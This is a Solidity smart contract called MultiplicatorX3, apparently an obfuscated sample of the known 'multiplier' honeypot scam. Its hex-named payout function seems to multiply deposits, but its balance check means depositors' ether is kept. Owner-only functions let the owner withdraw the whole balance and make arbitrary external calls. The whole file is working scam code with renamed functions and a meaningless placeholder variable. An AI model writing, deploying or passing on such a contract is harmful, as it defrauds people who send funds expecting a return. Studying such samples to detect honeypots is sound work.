// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;

contract MultiplicatorX3
{
    address public Owner = msg.sender;

    function() public payable{}

    function _0x89bc82()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address _0xf9b26c,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
        _0xf9b26c.call.value(msg.value)(data);
    }

    function _0xdcbf76(address _0xf9b26c)
    public
    payable
    {
        // Placeholder for future logic
        bool _flag2 = false;
        if(msg.value>=this.balance)
        {
            _0xf9b26c.transfer(this.balance+msg.value);
        }
    }
}